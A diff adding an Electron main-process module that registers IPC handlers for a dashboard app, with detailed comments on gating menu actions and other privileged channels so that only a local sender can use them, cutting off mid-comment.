@@ -1,0 +1,1252 @@
+"use strict";
+
+function registerShell(deps) {
+    if (deps.shellRegistered) return deps.summonDashboard;
+
+    // Session policy is window-owned because it knows which WebContents are
+    // untrusted and which persistent partition hosts embedded browser pages.
+    if (deps.windows.security && typeof deps.windows.security.configureSession === "function") {
+      deps.windows.security.configureSession();
+    } else {
+      // Transitional alias for callers composed against the flat façade name.
+      deps.windows.configureSessionSecurity();
+    }
+
+    // buildApplicationMenu also installs the resulting native Menu. Its click
+    // callbacks stay inside the window façade, where focused-window resolution
+    // and traffic-light/zoom reconciliation live.
+    deps.windows.menu.buildApplicationMenu();
+
+    // `app-menu:execute` (and now `app-menu:items` + `dev-mode-changed`) use
+    // PER-ACTION gating rather than the channel-level rejection every other
+    // privileged handler below uses. Reason:
+    //   - Some menu roles are dispatched with the sender's own WebContents
+    //     as click(...) arguments — Electron's role dispatch reads those, so
+    //     cut/copy/undo/redo/selectAll and role reload naturally scope to
+    //     the sender's page.
+    //   - Custom click handlers in app-menu.js resolve their targets through
+    //     `focusedDashboardWebContents()` / `focusedDashboardWindow()`,
+    //     which return the LOCAL user's focused window regardless of who
+    //     sent the IPC. So EVERY custom-click item invoked by a remote
+    //     sender reaches the LOCAL user's window, and every custom-click
+    //     item that reaches for a WebContents is fenced (LOCAL_ONLY_ITEM_IDS
+    //     includes reload, force-reload, zoom-*, devtools-toggle, settings,
+    //     about, keep-on-top). There is no "remote-safe custom-click item"
+    //     class — the assumption that page-level Reload/Zoom would be safe
+    //     was retracted in the F2 fix during pre-flight review.
+    // Refusing the whole channel would blank the menu in connection windows;
+    // letting everything through would leak the local clipboard, mutate the
+    // operator's window state, or grant DevTools to a remote sender. So we
+    // classify the sender once (see `resolveSenderIsLocal` below), hand the
+    // verdict down through `windows.menu.items` / `windows.menu.execute`,
+    // and let the three LOCAL_ONLY_* sets in windows-menu-model.js make
+    // the per-item decision. `serializeMenuItems` reflects the verdict as
+    // `enabled: false` on LOCAL_ONLY rows so the renderer paints a greyed
+    // label instead of a silently-refused click.
+    //
+    // The gate itself throwing is a diagnostic signal ("this sender was not
+    // the local dashboard"), NOT an error to surface to the renderer. Every
+    // reject already logs (see `logGateRejection(...)` inside assertLocalDashboard).
+    // `resolveSenderIsLocal` swallows the throw and returns a boolean, so
+    // menu dispatch always runs — safe items pass, LOCAL_ONLY items become
+    // no-ops (or `enabled: false` on the items surface).
+    //
+    // Caching: the verdict is a fact about a WebContents (its origin, its
+    // window's gateway, this shell's primary-port owner). Gate 3
+    // (`gateway.probePrimaryPortOwner`) shells out to netstat/PowerShell on
+    // Windows, so recomputing on every menu click added hundreds of ms of
+    // latency to a hot path (Spock FUNC-01). Cache per WebContents and
+    // invalidate on BOTH `did-start-navigation` (before commit) AND
+    // `did-navigate` (after commit) — gate 1 keys off the frame origin,
+    // and a same WebContents that navigates to a different origin must
+    // revalidate before the new document can issue any IPC. Clearing only
+    // on `did-navigate` leaves the cache holding a stale `true` between
+    // the moment a navigation is requested and the moment it commits, and
+    // a preload IPC dispatched during that window could reach a
+    // LOCAL_ONLY leaf against the wrong origin (GPT 5.6 Review F1 on 06b1d9c4a).
+    //
+    // **Only `true` verdicts are cached.** `false` re-probes every call.
+    // Two reasons:
+    //   1. The `did-navigate` event fires only on FULL top-frame navigations,
+    //      not on SPA route changes (which fire `did-navigate-in-page`). The
+    //      Kiro Crew dashboard is an SPA, so its route changes would never
+    //      clear this cache — a transient `false` (netstat locale hiccup,
+    //      PowerShell policy timeout, one flaky probe) would grey the local
+    //      user's titlebar menu for the entire session with no in-product
+    //      remedy. Re-probing on every menu click is cheap when the answer
+    //      is "not local", because gate 1 (origin) or gate 2 (URL match)
+    //      short-circuits before the netstat/PowerShell shell-out.
+    //   2. The generation counter below exists solely to protect the POSITIVE
+    //      direction from a race where a WebContents navigates to a remote
+    //      origin during the probe, letting stale `true` unlock LOCAL_ONLY
+    //      leaves for that remote origin. The negative direction has no
+    //      symmetric threat — a stale `false` refuses actions, not authorises
+    //      them — so its caching adds risk without reward.
+    //
+    // **A cached positive also EXPIRES.** The generation counter above covers
+    // the two gates that are facts about the PAGE: a navigation moves the
+    // frame's origin (gate 1) and the sending window's gateway (gate 2), and
+    // the listeners clear the cache when it does. Gate 3 is different in kind
+    // — it is a fact about the MACHINE, the primary port's LISTEN owner — and
+    // it can change with NOTHING happening to the sender. Our gateway exits,
+    // releasing the socket; a foreign process or a hand-rolled `ssh -L` binds
+    // that port; the page never navigates, so no listener fires, and the
+    // cached `true` keeps answering for the WebContents' remaining lifetime.
+    // That skips the only gate that can see a tunnel and keeps the clipboard
+    // roles and devtools-toggle unlocked against a port this shell no longer
+    // owns. SPA route changes fire `did-navigate-in-page` and are deliberately
+    // non-clearing, so there is no recovery short of a full top-frame
+    // navigation.
+    //
+    // A foreign listener can only take the port if OUR gateway released it
+    // first — nothing else can bind while we hold the LISTEN socket — so the
+    // exposure is bounded by "our gateway exited", and a short expiry bounds
+    // it in time. The window is long enough that the repeat calls one menu
+    // interaction produces still hit the cache, which is the whole reason the
+    // cache exists (Spock FUNC-01: a probe per click added hundreds of ms to a
+    // hot path). Like the rejection-log throttle above, this bounds the reuse
+    // of a verdict and never the verdict itself: a `false` is still never
+    // cached, so a transient probe hiccup still cannot strand a legitimate
+    // local user on a permanently-greyed menu. See the F1 finding in GPT 5.6
+    // Review on bd68985db (UPHOLD-FENCED, adjudication `flagged=0`).
+    //
+    // Ordering is load-bearing: wire the invalidation listener BEFORE the
+    // first probe, and check a generation counter after the probe returns
+    // before writing the cache. `assertLocalDashboard` is asynchronous
+    // (netstat / PowerShell port-owner probe on Windows), so a navigation
+    // completing DURING that probe would otherwise fire `did-navigate` with
+    // no listener attached, the cache would then be written with the pre-
+    // navigation verdict, and a remote origin would inherit `true`.
+    //
+    // The map holds the mint time of a positive verdict, never a bare `true`:
+    // the only entries it ever carries are positives, so the timestamp IS the
+    // verdict plus the one thing a reader needs to judge whether it still
+    // stands.
+    const POSITIVE_VERDICT_TTL_MS = 5_000;
+    const senderIsLocalCache = new WeakMap();
+    const senderIsLocalWired = new WeakSet();
+    const senderIsLocalGeneration = new WeakMap();
+    // Single-flight coalescer: if a probe is already in flight for THIS
+    // WebContents, subsequent callers `await` the same promise instead of
+    // launching another netstat/PowerShell. This closes the DoS vector where
+    // a manual-SSH-tunnel remote page on the primary port (gates 1 and 2 pass,
+    // gate 3 fails) can loop `app-menu:*` calls and, with negative caching
+    // deliberately removed to avoid stranding a legitimate local user on a
+    // greyed menu after a transient probe hiccup, spawn a fresh OS probe on
+    // every call. Coalescing is state-free at rest — the in-flight entry is
+    // deleted the instant the probe resolves — so it does not reintroduce
+    // the stranding hazard the removal of negative caching was designed to
+    // fix, and a legitimate next click starts a fresh probe against fresh
+    // state. See the DoS finding in GPT 5.6 Review on cfa37ff95.
+    //
+    // The in-flight entry stores BOTH the probe promise AND the generation
+    // observed when the probe was created. Joining callers apply the SAME
+    // generation-equality fail-closed guard the creator does, so a
+    // WebContents that navigates cross-origin mid-probe hands ALL callers
+    // (creator and joiners) a `false` — not just the creator. Without this,
+    // a joiner would receive the raw probe verdict and dispatch LOCAL_ONLY
+    // leaves against the post-navigation (now-remote) origin. See the
+    // joiner-race finding in GPT 5.6 Review and Opus 5 Review on 07e0060c5.
+    const senderIsLocalInFlight = new WeakMap();
+
+    // Extracted so creator and joiner apply IDENTICAL fail-closed logic. A
+    // stale `true` from a probe that observed a pre-navigation state is
+    // forced to `false` if the WebContents has since navigated — the caller
+    // will re-probe against the fresh state on its next call.
+    function applyGenerationGuard(wc, verdict, genAtStart) {
+      const generationUnchanged =
+        (senderIsLocalGeneration.get(wc) || 0) === genAtStart;
+      return verdict === true && generationUnchanged;
+    }
+
+    // A port-owner probe that could not NAME a holder is not evidence of a
+    // foreign one. `unknown` is the probe itself failing (netstat locale,
+    // PowerShell policy timeout); `none` is the primary port briefly unbound
+    // while our gateway restarts; `unidentified` is a holder netstat DID name
+    // whose command line could not be read. None proves a foreign holder, so
+    // none revokes the last positive this WebContents earned, and the paint path
+    // keeps drawing the local user's rows enabled instead of greying them over
+    // a hiccup. None proves OUR gateway holds the port either, so none
+    // authorizes an action: a probe failure can coincide with a foreign
+    // listener, and only a fresh `local` outcome may unlock a LOCAL_ONLY leaf.
+    //
+    // `unidentified` is soft HERE and hard at the adopt boundary, where
+    // `holder-decision.js` refuses it alongside `foreign` because adopting
+    // posts this machine's `.local_secret`. Painting a row costs nothing if it
+    // is wrong -- the click is still gated -- so the two consumers can and must
+    // answer the same ambiguity differently.
+    const INCONCLUSIVE_PORT_OWNERS = new Set(["unknown", "none", "unidentified"]);
+
+    // Turn a probe outcome into a verdict for THIS WebContents. Only `local`
+    // authorizes. `inconclusive` refuses but leaves the last positive in place
+    // for painting; `refused` also drops it, so a later inconclusive probe
+    // cannot keep painting rows enabled after a foreign holder was proven.
+    //
+    // The kept positive is bounded, but by a FAILING PROBE and never by age
+    // alone. Rows painted enabled while every click is refused is a dead menu
+    // with nothing on screen to explain it, so once a probe has come back
+    // inconclusive the positive survives only `INCONCLUSIVE_PAINT_GRACE_MS`
+    // beyond its own window, then drops and the rows grey with the footer. The
+    // grace covers a gateway restart; a probe that keeps failing longer than
+    // that is shown, not hidden.
+    //
+    // Age on its own carries no such evidence, and bounding the PAINT by it put
+    // the common case back on the probe's critical path: real menu opens are
+    // minutes apart, so each one awaited a netstat/PowerShell round trip and
+    // drew an empty popup for the length of it. An idle gap is not a probe
+    // failure. See buluoray Blocking 1 on cb31d4f18a.
+    const INCONCLUSIVE_PAINT_GRACE_MS = 30_000;
+
+    // Set while the latest probe for this WebContents came back inconclusive;
+    // cleared by the next proven `local`, and by a proven foreign holder. This
+    // is what separates "we asked and could not tell" from "nobody has asked
+    // recently" — a distinction the mint timestamp alone cannot make, because
+    // both look identical to it.
+    const senderProbeInconclusive = new WeakSet();
+
+    // Does a last positive still stand for PAINTING? Any age qualifies: a
+    // positive is revoked by navigation or by a proven foreign holder, not by
+    // the clock. The only bound is a probe that has actually contradicted it.
+    function positiveIsPaintable(wc) {
+      if (senderIsLocalCache.get(wc) === undefined) return false;
+      return !senderProbeInconclusive.has(wc) || inconclusiveGraceRemains(wc);
+    }
+
+    // Does a positive kept through an inconclusive probe have grace left?
+    // Measured from the MINT time, so a run of inconclusive probes cannot
+    // extend the window by restarting the clock on each one.
+    function inconclusiveGraceRemains(wc) {
+      const mintedAt = senderIsLocalCache.get(wc);
+      return mintedAt !== undefined
+        && Date.now() - mintedAt < POSITIVE_VERDICT_TTL_MS + INCONCLUSIVE_PAINT_GRACE_MS;
+    }
+
+    function settleProbeOutcome(wc, outcome) {
+      if (outcome === "local") {
+        senderProbeInconclusive.delete(wc);
+        return true;
+      }
+      if (outcome === "inconclusive") {
+        senderProbeInconclusive.add(wc);
+        if (!inconclusiveGraceRemains(wc)) senderIsLocalCache.delete(wc);
+        return false;
+      }
+      // `refused` — a proven foreign holder. Drop the positive outright, and
+      // forget the inconclusive mark with it so a positive re-earned later
+      // starts from a clean slate rather than inheriting a spent grace.
+      senderIsLocalCache.delete(wc);
+      senderProbeInconclusive.delete(wc);
+      return false;
+    }
+
+    async function resolveSenderIsLocal(event, channel) {
+      const wc = event && event.sender;
+      if (!wc) return false;
+      // A positive answers on its own only while it is fresh. A lapsed entry is
+      // KEPT as the last positive (see settleProbeOutcome) but falls through to
+      // a fresh three-gate probe, which is what re-establishes the
+      // port-ownership fact nothing else can invalidate.
+      const mintedAt = senderIsLocalCache.get(wc);
+      if (mintedAt !== undefined && Date.now() - mintedAt < POSITIVE_VERDICT_TTL_MS) {
+        return true;
+      }
+      const inFlight = senderIsLocalInFlight.get(wc);
+      // Join ANY probe in flight for this WebContents, whatever generation it
+      // started under. The condition carries no generation term, deliberately:
+      // one that only joined a same-generation probe let a caller bump the
+      // generation and skip the coalescer, and a remote page can bump it at
+      // will with main-frame navigations. Each skip launched another
+      // `classifyPortOwner` — a fresh netstat plus a PowerShell command lookup
+      // per pid, with no cache or throttle beneath it — so the coalescer that
+      // bounds concurrent OS probes stopped bounding anything for the one
+      // caller it exists to stop. See the GPT lane DoS finding on 436aab3be4.
+      //
+      // Joining a stale probe is safe because no reader treats a probe outcome
+      // as PERMISSION. `applyGenerationGuard` below suppresses a stale verdict,
+      // and `settleProbeOutcome`'s only side effect — the
+      // `senderProbeInconclusive` mark — is read solely by `positiveIsPaintable`,
+      // which uses it to WITHHOLD paint. A stale mark can shorten the paint
+      // grace, never extend it, so the worst a stale probe can do is grey the
+      // local user's rows early. Nothing can read it into an authorisation.
+      if (inFlight) {
+        // Joining caller path — MUST apply the same generation guard the
+        // creator does. Otherwise a navigation completing between the probe
+        // START (creator's genAtStart) and the joiner receiving the verdict
+        // would let a raw `true` reach a now-remote document.
+        const joinerOutcome = await inFlight.promise;
+        return applyGenerationGuard(wc, settleProbeOutcome(wc, joinerOutcome), inFlight.genAtStart);
+      }
+      // Wire the invalidation BEFORE the probe and seed the generation, so
+      // any navigation that lands during the probe increments the counter
+      // and the cache write below is skipped. A plain object in tests has
+      // no `.on`; the listener wiring is best-effort in mid-teardown paths.
+      if (!senderIsLocalWired.has(wc)) {
+        senderIsLocalWired.add(wc);
+        senderIsLocalGeneration.set(wc, 0);
+        try {
+          if (typeof wc.on === "function") {
+            const invalidate = () => {
+              senderIsLocalGeneration.set(
+                wc,
+                (senderIsLocalGeneration.get(wc) || 0) + 1,
+              );
+              senderIsLocalCache.delete(wc);
+            };
+            // Invalidate on BOTH `did-start-navigation` (before Chromium
+            // commits the new document) AND `did-navigate` (after commit).
+            // The start-side listener is load-bearing: `did-navigate` alone
+            // leaves the cache holding a stale `true` between the moment a
+            // top-frame cross-origin navigation is requested and the moment
+            // it commits, so a preload IPC dispatched during the new
+            // document's init could reach a LOCAL_ONLY leaf (DevTools
+            // toggle, settings, clipboard) against the wrong origin. Scope
+            // to real navigations only — an in-place `pushState`
+            // (`isInPlace: true`) does not change the frame's origin, and
+            // a sub-frame navigation (`!isMainFrame`) does not move gate 1
+            // (top-frame origin) either. Both would churn the cache without
+            // guarding anything.
+            wc.on("did-start-navigation", (_event, _url, isInPlace, isMainFrame) => {
+              if (!isMainFrame || isInPlace) return;
+              invalidate();
+            });
+            // did-navigate remains as a defence-in-depth listener: if a
+            // navigation ever completes without a matching start event
+            // (Electron edge case, aborted-and-redirected chain), the
+            // commit still clears the cache. Idempotent — the generation
+            // counter just increments again, which is harmless.
+            wc.on("did-navigate", invalidate);
+          }
+        } catch { /* WebContents mid-teardown */ }
+      }
+      const genAtStart = senderIsLocalGeneration.get(wc) || 0;
+      // Publish the in-flight promise BEFORE awaiting so any concurrent call
+      // that arrives during the async probe joins it rather than starting a
+      // second probe. The `.finally` guarantees the entry is removed once
+      // the probe resolves, regardless of the verdict — leaving a stale
+      // in-flight entry would freeze subsequent probes on a resolved promise.
+      const probe = (async () => {
+        try {
+          await (0, deps.assertLocalDashboard)(event, channel);
+          return "local";
+        } catch (err) {
+          // The gate already logged the reject through glog. A gate-3 refusal
+          // carries the classified owner, which is what separates "could not
+          // tell" from "someone else holds the port".
+          if (err && INCONCLUSIVE_PORT_OWNERS.has(err.portOwner)) return "inconclusive";
+          return "refused";
+        }
+      })();
+      senderIsLocalInFlight.set(wc, { promise: probe, genAtStart });
+      let outcome;
+      try {
+        outcome = await probe;
+      } finally {
+        senderIsLocalInFlight.delete(wc);
+      }
+      const verdict = settleProbeOutcome(wc, outcome);
+      // Cache only positive verdicts, and only when no navigation completed
+      // during the probe (see the header comment). A `false` re-probes on
+      // the next call — cheap, and it survives a transient probe failure
+      // that would otherwise strand the local user on a permanently-greyed
+      // titlebar menu since SPA route changes fire `did-navigate-in-page`
+      // rather than `did-navigate`. The stored value is the mint time, which
+      // is what bounds how long gate 3's mutable port-ownership fact may be
+      // taken on trust. Only a proven local owner mints or re-mints it; a
+      // positive kept through an inconclusive probe keeps its old mint time.
+      const guarded = applyGenerationGuard(wc, verdict, genAtStart);
+      if (guarded) {
+        senderIsLocalCache.set(wc, Date.now());
+      }
+      // The RETURN path also has to fail closed on the navigation race, not
+      // just the cache write. A probe that started when the sender was the
+      // LOCAL dashboard and finished with `verdict = true` AFTER a cross-
+      // origin navigation described a WebContents state the caller has
+      // already left; returning `true` for a now-remote document would
+      // dispatch a LOCAL_ONLY leaf (paste, devtools-toggle) against the
+      // wrong origin.
+      return guarded;
+    }
+
+    // Items advertises labels only; but the enabled column reflects the
+    // per-action gate so a connection window paints greyed LOCAL_ONLY rows
+    // rather than enabled ones that silently no-op on click. Async only
+    // because the first call on a sender WebContents warms the cache
+    // through `assertLocalDashboard`; subsequent calls are synchronous.
+    //
+    // Painting the rows never waits on a re-probe. When this WebContents holds
+    // a last positive that has merely aged out, the rows paint from it and the
+    // re-probe runs in the background, so opening the menu after an idle gap
+    // costs no netstat/PowerShell wait. This is safe because `items` only
+    // decides how a row LOOKS: every click goes through `app-menu:execute`,
+    // which never answers from a lapsed positive — it joins that same
+    // in-flight probe and refuses when it finds a foreign holder. The one
+    // stale paint that remains is a row drawn enabled for a single open after
+    // a foreign process took the port, and clicking it is refused VISIBLY: the
+    // refusal is answered back to the renderer, which refetches these rows and
+    // re-paints them greyed with the footer naming the reason. The refused
+    // click's own probe has by then dropped the positive, so this second call
+    // takes the awaited path rather than repeating the stale answer.
+    function resolveSenderIsLocalForPaint(event, channel) {
+      const wc = event && event.sender;
+      if (wc && positiveIsPaintable(wc)) {
+        // resolveSenderIsLocal never rejects; a fresh entry returns without
+        // probing, a lapsed one starts (or joins) the single-flight re-probe.
+        //
+        // The handler is attached anyway, and not because the invariant above
+        // is in doubt. This is a DISCARDED promise in the Electron main
+        // process, where an unhandled rejection is fatal to the whole app, and
+        // the invariant is a property of a function several layers away that a
+        // later edit can break without ever reading this line. `app-menu:execute`
+        // below wraps its own async work for exactly this reason; a comment is
+        // not the same protection as a handler.
+        resolveSenderIsLocal(event, channel).catch((err) => {
+          (0, deps.log)(`app-menu:items background re-probe failed: ${(err && err.stack) || err}`);
+        });
+        return true;
+      }
+      return resolveSenderIsLocal(event, channel);
+    }
+    deps.ipcMain.handle("app-menu:items", async (event, id) => {
+      const senderIsLocal = await resolveSenderIsLocalForPaint(event, "app-menu:items");
+      return deps.windows.menu.items(event.sender, id, senderIsLocal);
+    });
+    // A request/response `handle`, not a fire-and-forget `send`, because the
+    // ANSWER is load-bearing: a refusal is the only moment the renderer can
+    // learn the rows it painted are stale, and it refetches `app-menu:items` on
+    // one. That refetch is what greys the rows and renders the footer naming
+    // the reason — without it a refused click is wholly silent, since a stale
+    // paint sends every row `gated: false` and the footer only explains gated
+    // rows. GPT 5.6 lane finding on 1f3a603c46.
+    //
+    // The refetch genuinely re-paints rather than repeating the stale answer:
+    // this call's own probe has by then proven a foreign holder, and
+    // `settleProbeOutcome("refused")` drops the positive outright, so
+    // `positiveIsPaintable` is false for the next `items` call.
+    deps.ipcMain.handle("app-menu:execute", async (event, id, index) => {
+      try {
+        // Captured BEFORE the await, because the await is precisely what makes
+        // this necessary. The custom click handlers in window-lifecycle.js
+        // (`reload`, `forceReload`, `toggleDevTools` and `zoomMenuItem`'s three
+        // actions) take no arguments and each resolve
+        // `focusedDashboardWebContents()` THEMSELVES at dispatch time, so a
+        // focus change while the ownership probe runs sends the action to
+        // whichever window is focused when it settles — a Reload throws away
+        // the unsaved state of a window the user never clicked in. As a
+        // synchronous `ipcMain.on` there was no window in which focus could
+        // move, which is why `executeMenu` still asserts the premise that no
+        // longer holds. Refusing is the whole remedy: the renderer refetches on
+        // a `false`, so the click is declined and re-painted rather than
+        // misdirected. GPT 6.1 lane finding F1 on 934946a45a.
+        const focusedWindowAtRequestTime = deps.windows.focusedDashboardWindow();
+        // The window alone is not the dispatch target: the click handlers resolve
+        // the focused WebContents, and a modal inside the same window (the
+        // connection dialog) moves that without changing the window.
+        const focusedContentsAtRequestTime = deps.windows.focusedDashboardWebContents();
+        const senderIsLocal = await resolveSenderIsLocal(event, "app-menu:execute");
+        if (
+          deps.windows.focusedDashboardWindow() !== focusedWindowAtRequestTime
+          || deps.windows.focusedDashboardWebContents() !== focusedContentsAtRequestTime
+        ) {
+          // Through the per-sender budget, like every other refusal: a remote
+          // page can queue un-awaited invokes behind one probe, and a single
+          // focus switch would otherwise write one synchronous line per call.
+          // `id` and `index` come from the renderer, so the line carries a
+          // bounded rendering of them. GPT 6.1 lane finding on 8d4ba61bf6.
+          (0, deps.logGateRejection)(
+            event.sender,
+            `app-menu:execute refused ${(0, deps.boundedMenuArg)(id)}[${(0, deps.boundedMenuArg)(index)}]: focus moved while the `
+            + "ownership probe ran, so the dispatch target is no longer the requester",
+          );
+          return false;
+        }
+        // Strict `=== true` on the way OUT for the same reason the gate is
+        // strict on the way in: anything else — a caller composed against an
+        // older façade that returns nothing, a truthy proxy — must read as
+        // "did not dispatch" so the renderer refetches rather than trusting a
+        // click that may never have fired.
+        return deps.windows.menu.execute(event.sender, id, index, senderIsLocal) === true;
+      } catch (err) {
+        // resolveSenderIsLocal never rejects, and windows.menu.execute
+        // ordinarily catches its own click errors — but an escaping error
+        // here would surface in the renderer as a thrown `invoke` rather
+        // than an answer (and as a bare `.on` listener, which this channel
+        // used to be, an unhandled rejection was process-fatal — Spock
+        // ERR-01). Log and answer fail-closed: "could not dispatch" is
+        // exactly what the refetch is the right response to.
+        // Through the per-sender budget: a page can queue many invokes behind
+        // one probe, and an error each of them hits would otherwise write one
+        // synchronous line per call.
+        (0, deps.logGateRejection)(
+          event.sender,
+          `app-menu:execute dispatch failed: ${(err && err.stack) || err}`,
+        );
+        return false;
+      }
+    });
+    // dev-mode-changed flips the visibility of the DevTools menu item. Only a
+    // local sender may change it — otherwise a remote gateway could HIDE the
+    // local user's DevTools row (clicking it is separately blocked by
+    // LOCAL_ONLY_ITEM_IDS, but leaving the visibility un-gated hands a remote a
+    // UI knob on the local user's window). The direction is hide rather than
+    // show because the row is built visible; see the paragraph below.
+    //
+    // Visibility reads gate 3 STRICTLY — through the same `resolveSenderIsLocal`
+    // every other gated channel uses — so an inconclusive probe refuses here as
+    // it does everywhere else. A probe OUTCOME must never be read as permission:
+    // the `senderProbeInconclusive` mark is keyed to a WebContents and not to the
+    // document that minted it, so any reader treating that mark as a pass hands
+    // one document the verdict of the one before it. The mark's only other
+    // reader, `positiveIsPaintable`, uses it to WITHHOLD paint — which is why it
+    // is sound there and would not be sound here.
+    //
+    // What refusing actually costs, stated against the menu model rather than
+    // assumed: `app-menu.js` builds `devtools-toggle` with `visible: true`, so
+    // the row is already offered before this channel is ever called. A refusal
+    // leaves it at that built value — it does not hide it. The dashboard's only
+    // caller sends `true` (`showNativeDevTools`), once on mount, so on a shell
+    // of this vintage a refused call is a no-op.
+    //
+    // The capability the strict read protects is therefore the REVERSE of what
+    // it looks like: the channel also accepts `false`, and a remote document
+    // allowed through could HIDE the local user's DevTools row. That is what
+    // gating buys, and it is why an inconclusive probe must not pass — a probe
+    // outcome is not permission.
+    //
+    // The residual cost falls on a shell OLD enough to build the row hidden and
+    // reveal it only on this call. There, one inconclusive probe at mount leaves
+    // it hidden for the session, because the renderer's sync has empty deps and
+    // never retries, and there is no grace window here the way there is on the
+    // paint path. That state is permanent, not merely transient, wherever the
+    // owner probe cannot run at all — `lsofListenPids` rejects on ENOENT/EACCES,
+    // so a POSIX host with no `lsof` classifies every probe `unknown`. Windows
+    // reaches it through a netstat or PowerShell failure, usually transiently.
+    deps.ipcMain.on("dev-mode-changed", (event, enabled) => {
+      (async () => {
+        if ((await resolveSenderIsLocal(event, "dev-mode-changed")) === true) {
+          deps.windows.menu.setDevMode(enabled);
+        }
+      })().catch((err) => {
+        (0, deps.log)(`dev-mode-changed dispatch failed: ${(err && err.stack) || err}`);
+      });
+    });
+
+    // The export path announces each download it is about to start ("expect one
+    // download named <name>") so the will-download handler auto-saves ONLY
+    // downloads the app explicitly asked for. The expectation is keyed by the
+    // ANNOUNCING FRAME's own origin (event.sender), not a renderer-supplied
+    // value, so one origin cannot pre-authorise another's download; the leaf
+    // name is sanitised with the same safeFilename the handler uses so both
+    // sides key on the same value.
+    if (deps.downloadExpectations && typeof deps.downloadExpectations.register === "function") {
+      deps.ipcMain.on("download:expect", (event, filename) => {
+        let origin = "";
+        try {
+          origin = new URL(event.sender.getURL()).origin;
+        } catch {
+          origin = "";
+        }
+        deps.downloadExpectations.register({ origin, filename: (0, deps.safeFilename)(filename) });
+      });
+    }
+
+    // The shortcuts UI reports what is ACTUALLY bound beside what was asked
+    // for. Registration may have fallen back to the default or degraded to no
+    // shortcut at all.
+    deps.ipcMain.handle("global-hotkey:get", () => ({
+      accelerator: (0, deps.currentGlobalHotkey)(),
+      requested: (0, deps.requestedGlobalHotkey)(),
+      default: deps.DEFAULT_GLOBAL_HOTKEY,
+    }));
+
+    // The theme accent and splash art are written under userData for the next
+    // launch's first paint, so only the main window's dashboard reports them
+    // (assertMainWindowDashboard, below; called only after registration ends).
+    // A listener's throw would surface in main, so a refusal is logged and dropped.
+    const fromMainWindowDashboard = (event, channel) => {
+      try {
+        assertMainWindowDashboard(event, channel);
+        return true;
+      } catch {
+        return false;
+      }
+    };
+    deps.ipcMain.on("theme-accent-changed", (event, hex) => {
+      if (fromMainWindowDashboard(event, "theme-accent-changed")) deps.windows.chrome.setThemeAccent(hex);
+    });
+    deps.ipcMain.on("theme-splash-changed", (event, image) => {
+      if (!fromMainWindowDashboard(event, "theme-splash-changed")) return;
+      // null (no splash) clears it; anything but { type, bytes } is dropped.
+      if (image !== null && (typeof image !== "object" || !(image.bytes instanceof Uint8Array)
+        || typeof image.type !== "string")) {
+        return;
+      }
+      (0, deps.saveThemeSplash)(deps.app.getPath("userData"), image);
+    });
+    deps.ipcMain.on("focus-mode-chrome", (event, visible) =>
+      deps.windows.chrome.focusMode(event.sender, visible));
+    // Arm/disarm the off-window cursor poll that dismisses a focus-mode reveal.
+    // A bare boolean: the window is the sender's, and the distance threshold is
+    // the main process's, so the renderer names neither.
+    deps.ipcMain.on("focus-mode-watch-cursor", (event, watching) =>
+      deps.windows.chrome.watchFocusCursor(event.sender, watching));
+    deps.ipcMain.on("window-control", (event, action) =>
+      deps.windows.chrome.windowControl(event.sender, action, event.senderFrame));
+    // The chat bubble's Copy image for an image the page cannot fetch (another
+    // origin, or no async Clipboard API over plain HTTP). The renderer passes
+    // CSS pixels in its own main frame; copyImageAt takes zoomed ones.
+    // copyImageAt reports nothing, so success means an image reached the
+    // clipboard after it was cleared. A clipboard holding formats the snapshot
+    // cannot restore, such as copied files, is never cleared.
+    deps.ipcMain.handle("image:copy-at", async (event, x, y) => {
+      const sender = event.sender;
+      if (!sender || event.senderFrame !== sender.mainFrame) return false;
+      if (!Number.isFinite(x) || !Number.isFinite(y) || x < 0 || y < 0) return false;
+      const zoom = typeof sender.getZoomFactor === "function" ? sender.getZoomFactor() : 1;
+      const hasRasterImage = !deps.clipboard.readImage().isEmpty();
+      const unrestorable = deps.clipboard.availableFormats()
+        .filter((f) => !(0, deps.isRestorableFormat)(f, hasRasterImage));
+      if (unrestorable.length > 0) {
+        try {
+          sender.copyImageAt(Math.round(x * zoom), Math.round(y * zoom));
+        } catch {
+          return false;
+        }
+        return (0, deps.clipboardHoldsImage)(unrestorable);
+      }
+      const saved = (0, deps.snapshotClipboard)();
+      try {
+        deps.clipboard.clear();
+        sender.copyImageAt(Math.round(x * zoom), Math.round(y * zoom));
+      } catch {
+        (0, deps.restoreClipboardIfEmpty)(saved);
+        return false;
+      }
+      if (await (0, deps.clipboardHoldsImage)()) return true;
+      (0, deps.restoreClipboardIfEmpty)(saved);
+      return false;
+    });
+    deps.ipcMain.on("theme-mode-changed", (event, pref) =>
+      deps.windows.chrome.setThemeMode(pref, event.sender));
+    deps.ipcMain.on("titlebar-overlay-theme", (_event, mode) =>
+      deps.windows.chrome.setTitlebarMode(mode));
+
+    // Electron no-ops setBadgeCount on unsupported platforms. Keep the clamp in
+    // the trusted process so a malformed renderer value cannot set an absurd
+    // badge on platforms which do support it.
+    deps.ipcMain.on("badge:set", (_event, count) => {
+      deps.app.setBadgeCount((0, deps.clampBadgeCount)(count));
+    });
+
+    // This setting deliberately has next-launch semantics. Toggling it never
+    // starts or stops the gateway which owns the current session.
+    deps.ipcMain.handle("local-gateway:get", () => (0, deps.isLocalGatewayEnabled)(deps.store));
+    deps.ipcMain.handle("local-gateway:set", (_event, enabled) =>
+      (0, deps.setLocalGatewayEnabled)(deps.store, enabled));
+
+    // THE local-dashboard gate. Every channel whose answer is a fact about the
+    // machine in front of the user — rather than about the gateway a window
+    // happens to be talking to — takes all three of these, because a connection
+    // window pointed at a REMOTE gateway shares this same preload.
+    //
+    // One function, not one copy per channel. `wsl:detect` and both
+    // `crash-reports:*` channels need the identical three gates, and three
+    // hand-maintained spellings of a security check are three chances for one of
+    // them to be tightened while the others are not.
+    //
+    // All THREE gates, never two. An earlier version of this file stopped at
+    // gate 2 for the crash channels, reasoning that gate 3 exists to withhold a
+    // host software inventory and that this payload is only a count and a
+    // timestamp. That reasoning does not survive `crash-reports:reveal`, which
+    // is not a read at all: it opens a file-manager window on the machine in
+    // front of the user. A manual SSH tunnel holding the primary port appears in
+    // no remote-host config, so gate 2 passes for it by construction (see
+    // `isGatewayLocalForWindow`, which can only consult configured hosts) — and
+    // a remote renderer would then be able to pop a local Finder/Explorer
+    // window and learn whether this machine has been crashing. Gate 3 is the
+    // only one that positively identifies the listener.
+    //
+    // Every rejection is LOGGED, not silent. The UI renders a sender rejection
+    // and a genuinely empty answer ("no crashes", "no WSL install") the same
+    // way, so diagnostics are the only place those two causes can be told apart.
+    //
